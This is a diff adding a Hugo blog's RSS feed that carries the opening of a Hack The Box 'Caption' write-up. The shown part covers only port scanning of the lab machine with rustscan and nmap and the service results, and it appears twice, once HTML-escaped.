@@ -1,0 +1,725 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Bajo el Teclado</title>
+    <link>http://localhost:1313/tags/abusing-thrift-protocol/</link>
+    <description>Recent content on Bajo el Teclado</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <managingEditor>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</managingEditor>
+    <webMaster>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</webMaster>
+    <copyright>© 2024 pointedsec</copyright>
+    <lastBuildDate>Sun, 15 Sep 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/abusing-thrift-protocol/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hack The Box: Caption Writeup | Hard</title>
+      <link>http://localhost:1313/not_released/caption---hackthebox/</link>
+      <pubDate>Sun, 15 Sep 2024 00:00:00 +0000</pubDate><author>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</author>
+      <guid>http://localhost:1313/not_released/caption---hackthebox/</guid>
+      <description>&lt;h1 id=&#34;hack-the-box-caption-writeup&#34;&gt;Hack The Box: Caption Writeup&lt;/h1&gt;
+&lt;p&gt;Welcome to my detailed writeup of the hard difficulty machine &lt;strong&gt;&amp;ldquo;Caption&amp;rdquo;&lt;/strong&gt; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&lt;/p&gt;
+&lt;h1 id=&#34;tcp-enumeration&#34;&gt;TCP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ rustscan -a 10.129.230.251 --ulimit &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -g
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;2&lt;/span&gt;&lt;span&gt;10.129.230.251 -&amp;gt; [22,80,8080]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ nmap -p22,80,8080 -sCV 10.129.230.251 -oN allPorts                                                                                                                                                                                                                                                                 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 18:45 CEST                                                                                                                                                                                                                                                          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                                                                                                                                                                                                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Service scan Timing: About 33.33% done; ETC: 18:46 (0:00:12 remaining)                                                                                                                                                                                                                                                       
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;Nmap scan report for 10.129.230.251                                                                                                                                                                                                                                                                                          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;Host is up (0.23s latency).                                                                                                                                                                                                                                                                                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;                                                                                                                                                                                                                                                                                                                             
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;PORT     STATE SERVICE    VERSION                                                                                                                                                                                                                                                                                            
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;| ssh-hostkey:                                                                                                                                                                                                                                                                                                               
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)                                                                                                                                                                                                                                                              
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)                                                                                                                                                                                                                                                            
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;80/tcp   open  http                                                                                                                                                                                                                                                                                                          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;| fingerprint-strings:                                                                                                                                                                                                                                                                                                       
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;15&lt;/span&gt;&lt;span&gt;|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe:                                                                                                                                                                                                                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;16&lt;/span&gt;&lt;span&gt;|     HTTP/1.1 400 Bad request                                                                                                                                                                                                                                                                                               
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;17&lt;/span&gt;&lt;span&gt;|     Content-length: 90                                                                                                                                                                                                                                                                                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;18&lt;/span&gt;&lt;span&gt;|     Cache-Control: no-cache                                                                                                                                                                                                                                                                                                
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;19&lt;/span&gt;&lt;span&gt;|     Connection: close                                                                                                                                                                                                                                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;20&lt;/span&gt;&lt;span&gt;|     Content-Type: text/html                                                                                                                                                                                                                                                                                                
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;21&lt;/span&gt;&lt;span&gt;|     &amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;400 Bad request&amp;lt;/h1&amp;gt;                                                                                                                                                                                                                                                                                   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;22&lt;/span&gt;&lt;span&gt;|     Your browser sent an invalid request.                                                                                                                                                                                                                                                                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;23&lt;/span&gt;&lt;span&gt;|     &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;                                                                                                                                                                                                                                                                                                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;24&lt;/span&gt;&lt;span&gt;|   FourOhFourRequest, GetRequest, HTTPOptions:                                                                                                                                                                                                                                                                              
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;25&lt;/span&gt;&lt;span&gt;|     HTTP/1.1 301 Moved Permanently                                                                                                                                                                                                                                                                                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;26&lt;/span&gt;&lt;span&gt;|     content-length: 0                                                                                                                                                                                                                                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;27&lt;/span&gt;&lt;span&gt;|     location: http://caption.htb                                                                                                                                                                                                                                                                                           
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;28&lt;/span&gt;&lt;span&gt;|_    connection: close                                                                                                                                                                                                                                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;29&lt;/span&gt;&lt;span&gt;|_http-title: Did not follow redirect to http://caption.htb                                                                                                                                                                                                                                                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;30&lt;/span&gt;&lt;span&gt;8080/tcp open  http-proxy                                                                                                                                                                                                                                                                                                    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;31&lt;/span&gt;&lt;span&gt;|_http-title: GitBucket                                                                                                                                                                                                                                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;32&lt;/span&gt;&lt;span&gt;| fingerprint-strings:  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;33&lt;/span&gt;&lt;span&gt;.......
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1 id=&#34;udp-enumeration&#34;&gt;UDP Enumeration&lt;/h1&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ sudo nmap --top-ports &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;1500&lt;/span&gt; -sU --min-rate &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;5000&lt;/span&gt; -n -Pn 10.129.230.251 -oN allPorts.UDP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 2&lt;/span&gt;&lt;span&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 18:47 CEST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 3&lt;/span&gt;&lt;span&gt;Nmap scan report for 10.129.230.251
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Host is up (0.036s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 5&lt;/span&gt;&lt;span&gt;Not shown: 1494 open|filtered udp ports (no-response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 6&lt;/span&gt;&lt;span&gt;PORT      STATE  SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 7&lt;/span&gt;&lt;span&gt;120/udp   closed cfdptkt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 8&lt;/span&gt;&lt;span&gt;1049/udp  closed td-postman
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt; 9&lt;/span&gt;&lt;span&gt;26219/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;10&lt;/span&gt;&lt;span&gt;31625/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;11&lt;/span&gt;&lt;span&gt;41702/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;12&lt;/span&gt;&lt;span&gt;61319/udp closed unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;13&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;14&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#f00&#34;&gt;&lt;/span&gt;Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Del escaneo inicial detectamos dos cosas interesantes, un dominio &lt;code&gt;caption.htb&lt;/code&gt; que vamos a añadir al &lt;code&gt;/etc/hosts&lt;/code&gt; y una instancia de &lt;code&gt;GitBucket&lt;/code&gt; en el puerto 8080.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="hack-the-box-caption-writeup">Hack The Box: Caption Writeup</h1>
+<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Caption&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.230.251 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.230.251 -&gt; [22,80,8080]
+</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p22,80,8080 -sCV 10.129.230.251 -oN allPorts                                                                                                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 18:45 CEST                                                                                                                                                                                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Service scan Timing: About 33.33% done; ETC: 18:46 (0:00:12 remaining)                                                                                                                                                                                                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Nmap scan report for 10.129.230.251                                                                                                                                                                                                                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Host is up (0.23s latency).                                                                                                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>                                                                                                                                                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>PORT     STATE SERVICE    VERSION                                                                                                                                                                                                                                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>| ssh-hostkey:                                                                                                                                                                                                                                                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)                                                                                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)                                                                                                                                                                                                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>80/tcp   open  http                                                                                                                                                                                                                                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>| fingerprint-strings:                                                                                                                                                                                                                                                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe:                                                                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>|     HTTP/1.1 400 Bad request                                                                                                                                                                                                                                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>|     Content-length: 90                                                                                                                                                                                                                                                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>|     Cache-Control: no-cache                                                                                                                                                                                                                                                                                                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>|     Connection: close                                                                                                                                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>|     Content-Type: text/html                                                                                                                                                                                                                                                                                                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;                                                                                                                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>|     Your browser sent an invalid request.                                                                                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>|     &lt;/body&gt;&lt;/html&gt;                                                                                                                                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>|   FourOhFourRequest, GetRequest, HTTPOptions:                                                                                                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>|     HTTP/1.1 301 Moved Permanently                                                                                                                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>|     content-length: 0                                                                                                                                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>|     location: http://caption.htb                                                                                                                                                                                                                                                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>|_    connection: close                                                                                                                                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>|_http-title: Did not follow redirect to http://caption.htb                                                                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>8080/tcp open  http-proxy                                                                                                                                                                                                                                                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>|_http-title: GitBucket                                                                                                                                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>| fingerprint-strings:  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>.......
+</span></span></code></pre></div>
+<h1 id="udp-enumeration">UDP Enumeration</h1>
+
+
+
+
+
+
